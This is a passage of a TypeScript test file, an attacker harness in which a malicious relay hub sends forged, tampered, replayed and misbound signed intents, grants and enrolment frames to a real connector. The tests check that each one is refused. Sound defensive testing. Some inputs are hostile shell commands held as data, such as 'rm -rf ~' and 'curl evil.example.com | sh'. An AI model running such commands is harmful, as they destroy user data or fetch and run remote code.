/**
 * Attacker harness (docs/RELAY-SIGNED-INTENTS-AND-E2E-SPEC.md §11): a
 * malicious hub plays against a real RelayConnector, with a real
 * IntentVerifier and MachineEnrolment, on a machine whose policy is
 * `required`. The local Codekin server is a stub HTTP + WebSocket server that
 * records every hit, so each refusal is checked twice: the hub gets an error
 * back, and nothing reached the local server.
 *
 * The hub here is not ConnectorHub: it is a bare WebSocketServer that speaks
 * the hub protocol and sends whatever principals, intents and enrolment
 * frames a compromised relay could choose.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { createServer } from 'http'
import type { Server } from 'http'
import type { AddressInfo } from 'net'
import { createHash, generateKeyPairSync, randomBytes } from 'crypto'
import type { KeyObject } from 'crypto'
import { mkdtempSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { WebSocketServer } from 'ws'
import type { WebSocket } from 'ws'
import { RelayConnector } from './connector.js'
import { IntentVerifier } from './intent-verify.js'
import { IntentLog } from './intent-log.js'
import { approveEnrolment, MachineEnrolment, MAX_ENROLMENTS_PER_WINDOW, MAX_PENDING_ENROLMENTS } from './enrolment.js'
import { WebhookReplayGuard } from './connector-webhook-guard.js'
import {
  CHANNEL_OPEN_ACTION, DEVICE_REVOKE_ACTION, GRANT_ACTION, GRANT_REVOKE_ACTION, INTENT_MAX_SKEW_MS, MACHINE_TIME_LABEL, POLICY_ACTION,
  channelOpenPayload, encodePasskeyProofs, frameAction, framePayload, grantPayload, grantRevokePayload, intentChallengeInput, policyPayload, requestAction,
  requestPayload, requestSession, revokePayload,
} from './intent-actions.js'
import type { GrantBody, IntentBody, SignedGrant, SignedIntent } from './intent-actions.js'
import { commitment, POP_LABEL, signP1363, transcript, verifyP1363 } from './enrolment-crypto.js'
import { ensureMachineIdentity, keyIdForSpki, loadMachineSigningKey } from './machine-identity.js'
import { emptyTrustStore, readTrustStore, recordOwnerUserId, revokeCredential, setIntentPolicy, writeTrustStore } from './trust-store.js'
import type { TrustedCredential } from './trust-store.js'
import { envelope } from './relay-protocol.js'
import type { ProxyRequest, RelayEnvelopeKind, RelayPrincipal } from './relay-protocol.js'
import { keyIdForCoseKey } from './webauthn-verify.js'
import { softPasskey } from './__fixtures__/authenticator.js'
import type { SoftPasskey } from './__fixtures__/authenticator.js'

const MACHINE = 'm-adversary'
const RELAY_ORIGIN = 'https://relay.test'
const OWNER_ID = 'u-owner'
const DANA_ID = 'u-dana'
const OWNER: RelayPrincipal = { userId: OWNER_ID, role: 'owner', grants: {} }
const LOCAL_TOKEN = 'local-token'
const quiet = { log: () => undefined, warn: () => undefined }

interface Frame { kind: string; id?: string; channelId?: string; payload: Record<string, unknown> }
interface Key { spki: string; keyId: string; privateKey: KeyObject }

function newKey(): Key {
  const { publicKey, privateKey } = generateKeyPairSync('ec', { namedCurve: 'P-256' })
  const spki = publicKey.export({ format: 'der', type: 'spki' }).toString('base64url')
  return { spki, keyId: keyIdForSpki(spki), privateKey }
}

const sha = (bytes: Uint8Array) => createHash('sha256').update(bytes).digest('base64url')
const nonce = () => randomBytes(16).toString('base64url')

function waitFor(condition: () => boolean, timeoutMs = 3000): Promise<void> {
  return new Promise((resolve, reject) => {
    const started = Date.now()
    const timer = setInterval(() => {
      if (condition()) { clearInterval(timer); resolve() } else if (Date.now() - started > timeoutMs) { clearInterval(timer); reject(new Error('waitFor timeout')) }
    }, 5)
  })
}

/** An intent signed by a browser key; `fields` override any body field. */
function sign(k: Key, fields: Partial<IntentBody> & { action: string; payload: Uint8Array }): SignedIntent {
  const { payload, ...rest } = fields
  const body: IntentBody = {
    v: 1, machineId: MACHINE, sessionId: null, nonce: nonce(), ts: Date.now(), keyId: k.keyId, payloadHash: sha(payload), ...rest,
  }
  const text = JSON.stringify(body)
  return { body: text, sig: signP1363(k.privateKey, Buffer.from(text)).toString('base64url') }
}

/** The same intent with one body field changed after signing, signature kept. */
function tampered(intent: SignedIntent, change: Partial<IntentBody>): SignedIntent {
  return { ...intent, body: JSON.stringify({ ...JSON.parse(intent.body) as IntentBody, ...change }) }
}

/** An intent signed by a passkey (soft authenticator) over T("ck-intent-v1", body). */
function signWithPasskey(passkey: SoftPasskey, fields: Partial<IntentBody> & { action: string; payload: Uint8Array }): SignedIntent {
  const { payload, ...rest } = fields
  const body = JSON.stringify({
    v: 1, machineId: MACHINE, sessionId: null, nonce: nonce(), ts: Date.now(), keyId: keyIdForCoseKey(passkey.cosePublicKey), payloadHash: sha(payload), ...rest,
  })
  const challenge = createHash('sha256').update(intentChallengeInput(body)).digest()
  return { body, webauthn: { credentialId: passkey.credentialId, ...passkey.assert(challenge) } }
}

/** The stand-in for the local Codekin server: records every HTTP hit, socket and frame. */
interface LocalStub {
  server: Server
  wss: WebSocketServer
  origin: string
  hits: Array<{ method: string; url: string; auth: string | undefined }>
  connections: number
  /** Frames received after the connector's own `auth` handshake. */
  frames: string[]
}

async function startLocalStub(): Promise<LocalStub> {
  const server = createServer((req, res) => {
    stub.hits.push({ method: req.method ?? '', url: req.url ?? '', auth: req.headers.authorization })
    req.resume()
    req.on('end', () => {
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end('{"sessions":[]}')
    })
  })
  const wss = new WebSocketServer({ server })
  const stub: LocalStub = { server, wss, origin: '', hits: [], connections: 0, frames: [] }
  wss.on('connection', socket => {
    stub.connections++
    socket.on('message', raw => {
      const text = (raw as Buffer).toString('utf-8')
      const type = (JSON.parse(text) as { type?: unknown }).type
      if (type === 'auth') { socket.send(JSON.stringify({ type: 'connected', connectionId: `c${stub.connections}` })); return }
      stub.frames.push(text)
    })
  })
  await new Promise<void>(resolve => { server.listen(0, '127.0.0.1', () => { resolve() }) })
  stub.origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  return stub
}

/** The malicious hub: accepts the connector, acks it, then sends whatever the test chooses. */
interface FakeHub {
  server: Server
  wss: WebSocketServer
  url: string
  socket: WebSocket | null
  /** Everything the connector sent, in order. */
  frames: Frame[]
}

async function startFakeHub(): Promise<FakeHub> {
  const server = createServer()
  const wss = new WebSocketServer({ server, path: '/relay/connector' })
  const hub: FakeHub = { server, wss, url: '', socket: null, frames: [] }
  wss.on('connection', socket => {
    hub.socket = socket
    socket.on('message', raw => {
      const frame = JSON.parse((raw as Buffer).toString('utf-8')) as Frame
      hub.frames.push(frame)
      if (frame.kind === 'hello') {
        // A lying ack: another owner, and no workspace passkey rule.
        socket.send(JSON.stringify(envelope('hello_ack', {
          machineId: MACHINE, displayName: 'Dev box', ownerUserId: 'u-mallory', requirePasskeyStepUp: false,
        })))
      }
    })
  })
  await new Promise<void>(resolve => { server.listen(0, '127.0.0.1', () => { resolve() }) })
  hub.url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  return hub
}

async function closeServer(server: Server, wss: WebSocketServer): Promise<void> {
  for (const client of wss.clients) client.terminate()
  await new Promise<void>(resolve => { wss.close(() => { resolve() }) })
  server.closeAllConnections()
  await new Promise<void>(resolve => { server.close(() => { resolve() }) })
}

describe('a malicious hub against a real connector (§11 attacker harness)', () => {
  let dir: string
  let devicesFile: string
  let identityFile: string
  let machineKey: Buffer
  let owner: Key
  let dana: Key
  let local: LocalStub
  let hub: FakeHub
  let connector: RelayConnector
  let counter = 0

  /** Rewrite the device list: owner browser key plus `extra`, at `policy`. */
  function writeStore(extra: TrustedCredential[] = [], policy: 'off' | 'warn' | 'required' = 'required') {
    writeTrustStore(devicesFile, {
      ...emptyTrustStore(MACHINE, RELAY_ORIGIN, OWNER_ID),
      policy,
      credentials: [{ keyId: owner.keyId, kind: 'browser', userId: OWNER_ID, spki: owner.spki, label: 'Owner Firefox', addedAt: 'x', addedBy: 'local' }, ...extra],
    })
  }

  beforeEach(async () => {
    dir = mkdtempSync(join(tmpdir(), 'codekin-adversary-'))
    devicesFile = join(dir, 'relay-devices.json')
    identityFile = join(dir, 'relay-identity.json')
    machineKey = Buffer.from(ensureMachineIdentity(MACHINE, RELAY_ORIGIN, { file: identityFile, store: null, log: quiet }).publicKey, 'base64url')
    owner = newKey()
    dana = newKey()
    writeStore()

    local = await startLocalStub()
    hub = await startFakeHub()

    const signingKey = loadMachineSigningKey(identityFile, null)
    const intents = new IntentVerifier({
      machineId: MACHINE,
      devicesFile,
      log: new IntentLog(join(dir, 'intents.jsonl'), Date.now, quiet),
      warn: quiet,
      signWithMachineKey: data => (signingKey ? signP1363(signingKey, data).toString('base64url') : null),
    })
    connector = new RelayConnector({
      relayUrl: hub.url,
      machineId: MACHINE,
      machineSecret: 'secret',
      connectorVersion: '0.10.6-test',
      localTarget: { origin: local.origin, authToken: LOCAL_TOKEN },
      webhookGuard: new WebhookReplayGuard(null),
      identityKey: machineKey.toString('base64url'),
      intents,
      enrolment: new MachineEnrolment({ machineId: MACHINE, identityFile, devicesFile, secretStore: null, log: quiet, intents }),
      onOwner: ownerUserId => { recordOwnerUserId(MACHINE, ownerUserId, devicesFile, quiet) },
    })
    connector.start()
    // hello → lying hello_ack → the connector's own session count, which is
    // the one local call that doesn't come from the relay.
    await waitFor(() => local.hits.some(h => h.url === '/api/sessions/list'))
    local.hits = []
  })

  afterEach(async () => {
    connector.stop()
    await closeServer(hub.server, hub.wss)
    await closeServer(local.server, local.wss)
    rmSync(dir, { recursive: true, force: true })
  })

  // --- Hub helpers -------------------------------------------------------------

  function hubSend(kind: string, payload: unknown, extra: { id?: string; channelId?: string }): void {
    hub.socket?.send(JSON.stringify(envelope(kind as RelayEnvelopeKind, payload, extra)))
  }

  /** The first frame after `from` matching `pred`. */
  async function next(pred: (f: Frame) => boolean, from: number): Promise<Frame> {
    let found: Frame | undefined
    await waitFor(() => (found = hub.frames.slice(from).find(pred)) !== undefined)
    return found!
  }

  /** Send a frame that expects one answer by id. */
  async function ask(kind: string, payload: unknown): Promise<Frame> {
    const id = `r${++counter}`
    const mark = hub.frames.length
    hubSend(kind, payload, { id })
    return next(f => f.id === id, mark)
  }

  const request = (req: ProxyRequest) => ask('request', req)
  const enrol = (kind: string, payload: unknown, principal: RelayPrincipal = OWNER) => ask(kind, { principal, payload })

  /** A request as the owner's browser would sign it; `signedPath` lets the hub send a different one. */
  function signedRequest(method: string, path: string, opts: {
    key?: Key; principal?: RelayPrincipal; body?: string; contentType?: string; signedPath?: string; intent?: Partial<IntentBody>
  } = {}): ProxyRequest {
    const bodyBytes = opts.body === undefined ? null : Buffer.from(opts.body)
    const signedPath = opts.signedPath ?? path
    const intent = sign(opts.key ?? owner, {
      action: requestAction(method, signedPath),
      payload: requestPayload(method, signedPath, opts.contentType, bodyBytes),
      sessionId: requestSession(signedPath),
      ...opts.intent,
    })
    return {
      method, path, principal: opts.principal ?? OWNER, intent,
      ...(opts.contentType ? { contentType: opts.contentType } : {}),
      ...(bodyBytes ? { body: bodyBytes.toString('base64') } : {}),
    }
  }

  function expectIntentRefusal(frame: Frame, detail: string): void {
    expect(frame).toMatchObject({ kind: 'error', payload: { code: 'not_permitted', detail } })
  }

  /** Open a channel; returns the first answer on it (`event` open, or `error`). */
  async function openChannel(opts: { principal?: RelayPrincipal; key?: Key; intent?: SignedIntent | null } = {}): Promise<{ channelId: string; token: string; reply: Frame }> {
    const channelId = `ch${++counter}`
    const token = nonce()
    const intent = opts.intent === undefined
      ? sign(opts.key ?? owner, { action: CHANNEL_OPEN_ACTION, payload: channelOpenPayload(), channel: token })
      : opts.intent
    const mark = hub.frames.length
    hubSend('stream_open', { principal: opts.principal ?? OWNER, ...(intent ? { intent } : {}) }, { channelId })
    const reply = await next(f => f.channelId === channelId && (f.kind === 'event' || f.kind === 'error'), mark)
    return { channelId, token, reply }
  }

  /** A stream frame's intent, bound to the channel and its order. */
  function frameIntent(k: Key, data: string, token: string, seq: number, sessionId: string | null, extra: Partial<IntentBody> = {}): SignedIntent {
    return sign(k, { action: frameAction(data), payload: framePayload(data), sessionId, channel: token, seq, ...extra })
  }

  /** Send a frame that must be refused; returns the refusal. */
  async function refusedFrame(channelId: string, data: string, intent?: SignedIntent): Promise<Frame> {
    const mark = hub.frames.length
    hubSend('stream_data', { data, ...(intent ? { intent } : {}) }, { channelId })
    return next(f => f.channelId === channelId && f.kind === 'error', mark)
  }

  /** Send a frame that must reach the local server (also a barrier: frames on one socket stay in order). */
  async function acceptedFrame(channelId: string, data: string, intent: SignedIntent): Promise<void> {
    const before = local.frames.length
    hubSend('stream_data', { data, intent }, { channelId })
    await waitFor(() => local.frames.length > before)
    expect(local.frames.at(-1)).toBe(data)
  }

  // --- Grants -------------------------------------------------------------------

  function grant(overrides: Partial<GrantBody> = {}, signer: Key = owner, intentOverrides: Partial<IntentBody> = {}): SignedGrant {
    const body: GrantBody = {
      grantId: 'share1', sessionId: 's1', granteeUserId: DANA_ID, permissions: ['view', 'send_prompt'],
      granteeKeys: [{ keyId: dana.keyId, spki: dana.spki }], expiresAt: Date.now() + 24 * 60 * 60_000, ...overrides,
    }
    const text = JSON.stringify(body)
    return { grant: text, intent: sign(signer, { action: GRANT_ACTION, sessionId: body.sessionId, payload: grantPayload(text), ...intentOverrides }) }
  }

  const danaPrincipal = (signedGrants: SignedGrant[] | undefined, grants: Record<string, string[]> = { s1: ['view', 'send_prompt'] }): RelayPrincipal =>
    ({ userId: DANA_ID, role: 'grantee', grants, ...(signedGrants ? { signedGrants } : {}) })

  // --- Positive controls --------------------------------------------------------

  describe('positive controls', () => {
    it('runs a correctly signed owner request on the local server, with the machine token', async () => {
      const reply = await request(signedRequest('GET', '/api/repos'))
      expect(reply).toMatchObject({ kind: 'response', payload: { status: 200 } })
      expect(local.hits).toEqual([{ method: 'GET', url: '/api/repos', auth: `Bearer ${LOCAL_TOKEN}` }])
    })

    it('opens a signed channel and forwards signed frames', async () => {
      const { channelId, token, reply } = await openChannel()
      expect(reply).toMatchObject({ kind: 'event', payload: { status: 'open' } })
      const join = '{"type":"join_session","sessionId":"s1"}'
      await acceptedFrame(channelId, join, frameIntent(owner, join, token, 1, 's1'))
      const input = '{"type":"input","data":"ls"}'
      await acceptedFrame(channelId, input, frameIntent(owner, input, token, 2, 's1'))
      expect(local.frames).toEqual([join, input])
    })

    it('never takes the owner the hub names over the one recorded at pairing', () => {
      expect(hub.frames.find(f => f.kind === 'hello')?.payload).toMatchObject({ machineId: MACHINE, intentPolicy: 'required' })
      expect(readTrustStore(devicesFile)?.ownerUserId).toBe(OWNER_ID)
    })
  })

  // --- Owner intents -------------------------------------------------------------

  describe('owner traffic', () => {
    it('refuses an owner principal with no intent: request, channel open and frame', async () => {
      expectIntentRefusal(await request({ method: 'GET', path: '/api/repos', principal: OWNER }), 'intent_required')

      const refusedOpen = await openChannel({ intent: null })
      expectIntentRefusal(refusedOpen.reply, 'intent_required')
      // A frame for the channel that was never opened goes nowhere.
      hubSend('stream_data', { data: '{"type":"input","data":"rm -rf ~"}' }, { channelId: refusedOpen.channelId })

      const { channelId, token } = await openChannel()
      expectIntentRefusal(await refusedFrame(channelId, '{"type":"input","data":"ls"}'), 'intent_required')
      // Barrier: a signed frame on the same socket arrives, and only it.
      const join = '{"type":"join_session","sessionId":"s1"}'
      await acceptedFrame(channelId, join, frameIntent(owner, join, token, 1, 's1'))
      expect(local.frames).toEqual([join])
      expect(local.connections).toBe(1)
      expect(local.hits).toEqual([])
    })

    it('refuses an intent whose payloadHash, action, machineId or sessionId was edited after signing', async () => {
      const path = '/api/sessions/s1'
      for (const change of [
        { payloadHash: sha(Buffer.from('something else')) },
        { action: requestAction('DELETE', path) },
        { machineId: 'm-other' },
        { sessionId: 's2' },
      ] satisfies Array<Partial<IntentBody>>) {
        const req = signedRequest('GET', path)
        expectIntentRefusal(await request({ ...req, intent: tampered(req.intent!, change) }), 'intent_bad_signature')
      }
      expect(local.hits).toEqual([])
    })

    it('refuses a validly signed intent that names another payload, action, machine or session', async () => {
      // Signed for a body of {}, delivered with another body.
      const post = signedRequest('POST', '/api/sessions/s1/stop', { body: '{}', contentType: 'application/json' })
      expectIntentRefusal(await request({ ...post, body: Buffer.from('{"force":true}').toString('base64') }), 'intent_wrong_payload')
      // Same body, another content type (the local server may parse it differently).
      expectIntentRefusal(await request({ ...signedRequest('POST', '/api/sessions/s1/stop', { body: '{}', contentType: 'application/json' }), contentType: 'text/plain' }), 'intent_wrong_payload')
      // Signed as a GET, delivered as a DELETE of the same path.
      const get = signedRequest('GET', '/api/sessions/s1')
      expectIntentRefusal(await request({ ...get, method: 'DELETE' }), 'intent_wrong_action')
      // Signed for another machine.
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { intent: { machineId: 'm-other' } })), 'intent_wrong_machine')
      // Signed for session s2, delivered for s1.
      expectIntentRefusal(await request(signedRequest('GET', '/api/sessions/s1', { intent: { sessionId: 's2' } })), 'intent_wrong_session')
      expect(local.hits).toEqual([])
    })

    it('refuses a replayed nonce, on requests and channel opens', async () => {
      const req = signedRequest('GET', '/api/repos')
      expect((await request(req)).kind).toBe('response')
      expectIntentRefusal(await request(req), 'intent_replayed')
      expect(local.hits).toHaveLength(1)

      const openIntent = sign(owner, { action: CHANNEL_OPEN_ACTION, payload: channelOpenPayload(), channel: nonce() })
      expect((await openChannel({ intent: openIntent })).reply.kind).toBe('event')
      expectIntentRefusal((await openChannel({ intent: openIntent })).reply, 'intent_replayed')
      await waitFor(() => local.connections === 1)
      expect(local.connections).toBe(1)
    })

    it('refuses a stale and a future ts, with a machine-signed clock the hub cannot alter', async () => {
      for (const ts of [Date.now() - INTENT_MAX_SKEW_MS - 60_000, Date.now() + INTENT_MAX_SKEW_MS + 60_000]) {
        const req = signedRequest('GET', '/api/repos', { intent: { ts } })
        const refused = await request(req)
        expectIntentRefusal(refused, 'intent_stale')
        const { machineTime, machineTimeSig, intentNonce } = refused.payload as { machineTime: number; machineTimeSig: string; intentNonce: string }
        expect(intentNonce).toBe((JSON.parse(req.intent!.body) as IntentBody).nonce)
        expect(verifyP1363(machineKey, transcript(MACHINE_TIME_LABEL, intentNonce, String(machineTime)), Buffer.from(machineTimeSig, 'base64url'))).toBe(true)
      }
      expect(local.hits).toEqual([])
    })

    it('refuses an unknown key, a revoked key, and a grantee key used for owner actions', async () => {
      // Unknown: the relay's own key.
      const relayKey = newKey()
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { key: relayKey })), 'intent_unknown_key')
      expectIntentRefusal((await openChannel({ key: relayKey })).reply, 'intent_unknown_key')

      // Revoked: a second owner browser works, then is removed on the machine.
      const laptop = newKey()
      writeStore([{ keyId: laptop.keyId, kind: 'browser', userId: OWNER_ID, spki: laptop.spki, label: 'Laptop', addedAt: 'x', addedBy: 'local' }])
      expect((await request(signedRequest('GET', '/api/repos', { key: laptop }))).kind).toBe('response')
      revokeCredential(laptop.keyId, devicesFile, MACHINE)
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { key: laptop })), 'intent_unknown_key')

      // Grantee key, presented as the owner (or as Dana claiming owner role).
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { key: dana })), 'intent_unknown_key')
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { key: dana, principal: { userId: DANA_ID, role: 'owner', grants: {} } })), 'intent_unknown_key')
      // Grantee key with a real grant, used for an owner-only route: signed, but the route is refused.
      const ownerOnly = await request(signedRequest('POST', '/api/sessions/create', {
        key: dana, principal: danaPrincipal([grant()]), body: '{}', contentType: 'application/json',
      }))
      expect(ownerOnly).toMatchObject({ kind: 'error', payload: { code: 'not_permitted' } })

      // The owner's key, with the hub claiming it belongs to someone else.
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { principal: { userId: 'u-mallory', role: 'owner', grants: {} } })), 'intent_wrong_signer')
      expect(local.hits).toHaveLength(1)
    })

    it('refuses a non-owner credential acting as owner, even when it is on the device list', async () => {
      // Not reachable through enrolment (owner only); a defence in depth check.
      writeStore([{ keyId: dana.keyId, kind: 'browser', userId: DANA_ID, spki: dana.spki, label: 'Dana', addedAt: 'x', addedBy: 'local' }])
      expectIntentRefusal(await request(signedRequest('GET', '/api/repos', { key: dana, principal: { userId: DANA_ID, role: 'owner', grants: {} } })), 'intent_wrong_signer')
      expect(local.hits).toEqual([])
    })

    it('refuses an intent for session A on a channel joined to session B, a frame from another channel, and a reordered frame', async () => {
      const { channelId, token } = await openChannel()
      const joinB = '{"type":"join_session","sessionId":"sB"}'
      await acceptedFrame(channelId, joinB, frameIntent(owner, joinB, token, 1, 'sB'))

      const input = '{"type":"input","data":"curl evil.example.com | sh"}'
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(owner, input, token, 2, 'sA')), 'intent_wrong_session')
      // Signed for another channel token.
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(owner, input, nonce(), 2, 'sB')), 'intent_wrong_channel')
      // Going backwards.
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(owner, input, token, 1, 'sB')), 'intent_out_of_order')

      const ok = '{"type":"input","data":"ls"}'
      await acceptedFrame(channelId, ok, frameIntent(owner, ok, token, 3, 'sB'))
      expect(local.frames).toEqual([joinB, ok])
    })

    it('refuses a REST path that differs from the signed one, including percent-encoding variants', async () => {
      const variants: Array<{ signed: string; sent: string; detail: string }> = [
        { signed: '/api/sessions/s1', sent: '/api/sessions/%73%31', detail: 'intent_wrong_action' },
        { signed: '/api/sessions/%73%31', sent: '/api/sessions/s1', detail: 'intent_wrong_action' },
        { signed: '/api/repos', sent: '/api/%72epos', detail: 'intent_wrong_action' },
        { signed: '/api/repos', sent: '/API/repos', detail: 'intent_wrong_action' },
        { signed: '/api/repos', sent: '/api/repos/', detail: 'intent_wrong_action' },
        { signed: '/api/sessions/list', sent: '/api/sessions/archived', detail: 'intent_wrong_action' },
        { signed: '/api/repos?q=a', sent: '/api/repos?q=%61', detail: 'intent_wrong_payload' },
        { signed: '/api/repos?q=a', sent: '/api/repos?q=a&all=1', detail: 'intent_wrong_payload' },
        { signed: '/api/repos', sent: '/api/repos?', detail: 'intent_wrong_payload' },
      ]
      for (const { signed, sent, detail } of variants) {
        expectIntentRefusal(await request(signedRequest('GET', sent, { signedPath: signed })), detail)
      }
      expect(local.hits).toEqual([])
    })

    it('keeps webhook principals to the webhook route, and off streams', async () => {
      const webhook: RelayPrincipal = { userId: OWNER_ID, role: 'webhook', grants: {} }
      const refused = await request({ method: 'GET', path: '/api/repos', principal: webhook, headers: { 'x-github-delivery': 'd1' } })
      expect(refused).toMatchObject({ kind: 'error', payload: { code: 'not_permitted' } })
      expect((await openChannel({ principal: webhook })).reply).toMatchObject({ kind: 'error', payload: { code: 'forbidden' } })
      expect(local.hits).toEqual([])
      expect(local.connections).toBe(0)
    })
  })

  // --- Step-up -------------------------------------------------------------------

  describe('step-up with an enrolled passkey', () => {
    let passkey: SoftPasskey

    beforeEach(() => {
      passkey = softPasskey()
      writeStore([{
        keyId: keyIdForCoseKey(passkey.cosePublicKey), kind: 'passkey', userId: OWNER_ID, credentialId: passkey.credentialId,
        cosePublicKey: passkey.cosePublicKey, rpId: 'relay.test', label: 'Passkey', addedAt: 'x', addedBy: 'local',
      }])
    })

    it('refuses a privileged request signed with the browser key, and runs it signed with the passkey', async () => {
      const body = '{"workingDir":"/tmp","permissionMode":"bypassPermissions"}'
      const opts = { body, contentType: 'application/json' }
      const refused = await request(signedRequest('POST', '/api/sessions/create', opts))
      expectIntentRefusal(refused, 'intent_step_up_required')
      expect(refused.payload.stepUpPasskeys).toEqual([{ credentialId: passkey.credentialId, keyId: keyIdForCoseKey(passkey.cosePublicKey) }])
      expect(local.hits).toEqual([])

      const path = '/api/sessions/create'
      const intent = signWithPasskey(passkey, {
        action: requestAction('POST', path), payload: requestPayload('POST', path, 'application/json', Buffer.from(body)),
      })
      expect(await request({ method: 'POST', path, principal: OWNER, contentType: 'application/json', body: Buffer.from(body).toString('base64'), intent }))
        .toMatchObject({ kind: 'response', payload: { status: 200 } })
      expect(local.hits).toEqual([{ method: 'POST', url: path, auth: `Bearer ${LOCAL_TOKEN}` }])
    })

    it('refuses a privileged frame signed with the browser key', async () => {
      const { channelId, token } = await openChannel()
      const join = '{"type":"join_session","sessionId":"s1"}'
      await acceptedFrame(channelId, join, frameIntent(owner, join, token, 1, 's1'))
      const bypass = '{"type":"set_permission_mode","permissionMode":"bypassPermissions"}'
      expectIntentRefusal(await refusedFrame(channelId, bypass, frameIntent(owner, bypass, token, 2, 's1')), 'intent_step_up_required')
      const ok = '{"type":"input","data":"ls"}'
      await acceptedFrame(channelId, ok, frameIntent(owner, ok, token, 3, 's1'))
      expect(local.frames).toEqual([join, ok])
    })

    it('refuses a device revocation signed with the browser key', async () => {
      const keyId = keyIdForCoseKey(passkey.cosePublicKey)
      const refused = await enrol('enrol_revoke', { keyId, intent: sign(owner, { action: DEVICE_REVOKE_ACTION, payload: revokePayload(keyId) }) })
      expect(refused).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
      expect(readTrustStore(devicesFile)?.credentials.map(c => c.keyId)).toContain(keyId)
    })
  })

  // --- Grantees -------------------------------------------------------------------

  describe('grantee traffic', () => {
    it('refuses a fabricated grantee principal with no signed grant, or one signed by a key not on the machine', async () => {
      const list = '/api/sessions/list'
      expectIntentRefusal(await request(signedRequest('GET', list, { key: dana, principal: danaPrincipal(undefined) })), 'intent_unknown_key')
      expectIntentRefusal((await openChannel({ key: dana, principal: danaPrincipal([]) })).reply, 'intent_unknown_key')
      // The relay signs a grant itself.
      const forged = grant({}, newKey())
      expectIntentRefusal((await openChannel({ key: dana, principal: danaPrincipal([forged]) })).reply, 'intent_unknown_key')
      // No intent at all, as a grantee.
      expectIntentRefusal(await request({ method: 'GET', path: list, principal: danaPrincipal([grant()]) }), 'intent_required')
      expect(local.hits).toEqual([])
      expect(local.connections).toBe(0)
    })

    it('refuses an expired grant', async () => {
      const expired = grant({ expiresAt: Date.now() - 1000 })
      expectIntentRefusal((await openChannel({ key: dana, principal: danaPrincipal([expired]) })).reply, 'intent_unknown_key')
      expectIntentRefusal(await request(signedRequest('GET', '/api/sessions/list', { key: dana, principal: danaPrincipal([expired]) })), 'intent_unknown_key')
      expect(local.hits).toEqual([])
      expect(local.connections).toBe(0)
    })

    it('refuses a revoked grant, including on a channel opened before the revocation', async () => {
      const principal = danaPrincipal([grant()])
      const { channelId, token, reply } = await openChannel({ key: dana, principal })
      expect(reply.kind).toBe('event')
      const join = '{"type":"join_session","sessionId":"s1"}'
      await acceptedFrame(channelId, join, frameIntent(dana, join, token, 1, 's1'))

      // The owner revokes the share on the machine, through the same hub.
      const revoked = await enrol('enrol_grant_revoke', {
        grantId: 'share1', intent: sign(owner, { action: GRANT_REVOKE_ACTION, payload: grantRevokePayload('share1') }),
      })
      expect(revoked).toMatchObject({ kind: 'enrol_result', payload: { state: 'approved' } })

      // The hub keeps presenting the old grant.
      const input = '{"type":"input","data":"ls"}'
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(dana, input, token, 2, 's1')), 'intent_unknown_key')
      expectIntentRefusal((await openChannel({ key: dana, principal })).reply, 'intent_unknown_key')
      expect(local.frames).toEqual([join])
      expect(local.connections).toBe(1)
    })

    it('refuses a grantee frame signed by a key outside the grant, or for a session the grant does not cover', async () => {
      const principal = danaPrincipal([grant()])
      const { channelId, token } = await openChannel({ key: dana, principal })
      const join = '{"type":"join_session","sessionId":"s1"}'
      await acceptedFrame(channelId, join, frameIntent(dana, join, token, 1, 's1'))

      const input = '{"type":"input","data":"ls"}'
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(newKey(), input, token, 2, 's1')), 'intent_unknown_key')
      // The owner's key is not in Dana's grant either: no borrowing it for a grantee channel.
      expectIntentRefusal(await refusedFrame(channelId, input, frameIntent(owner, input, token, 2, 's1')), 'intent_unknown_key')
      const other = '{"type":"join_session","sessionId":"s9"}'
      expectIntentRefusal(await refusedFrame(channelId, other, frameIntent(dana, other, token, 2, 's9')), 'intent_unknown_key')

      await acceptedFrame(channelId, input, frameIntent(dana, input, token, 3, 's1'))
      expect(local.frames).toEqual([join, input])
    })
  })

  // --- Enrolment ------------------------------------------------------------------

  describe('enrolment', () => {
    function browser(label = 'Mallory Chrome') {
      const k = newKey()
      const spki = Buffer.from(k.spki, 'base64url')
      const nonceB = randomBytes(32)
      return { ...k, spkiBytes: spki, nonceB, label, commit: commitment(spki, [], label, nonceB) }
    }

    function revealOf(b: ReturnType<typeof browser>, enrolId: string, nonceM: string) {
      return {
        enrolId, spki: b.spki, passkeys: [], label: b.label, nonceB: b.nonceB.toString('base64url'),
        pop: signP1363(b.privateKey, transcript(POP_LABEL, enrolId, Buffer.from(nonceM, 'base64url'), encodePasskeyProofs([]))).toString('base64url'),
      }
    }

    async function commit(b: ReturnType<typeof browser>): Promise<{ enrolId: string; nonceM: string }> {
      const challenge = await enrol('enrol_commit', { commit: b.commit.toString('base64url') })
      expect(challenge.kind).toBe('enrol_challenge')
      return challenge.payload as { enrolId: string; nonceM: string }
    }

    it('refuses an enrol_reveal that does not open its commit, and spends the request', async () => {
      const honest = browser('Owner Safari')
      const { enrolId, nonceM } = await commit(honest)
      // The relay saw nonceM and reveals a key of its own instead.
      const swapped = await enrol('enrol_reveal', revealOf(browser(), enrolId, nonceM))
      expect(swapped).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
      expect(String(swapped.payload.message)).toMatch(/commitment/)
      // The request is spent: not even the honest reveal completes it now.
      expect(await enrol('enrol_reveal', revealOf(honest, enrolId, nonceM))).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
      expect(readTrustStore(devicesFile)?.credentials.map(c => c.keyId)).toEqual([owner.keyId])
      expect(local.hits).toEqual([])
    })

    it('refuses enrolment from anyone but the recorded owner', async () => {
      const b = browser()
      for (const principal of [
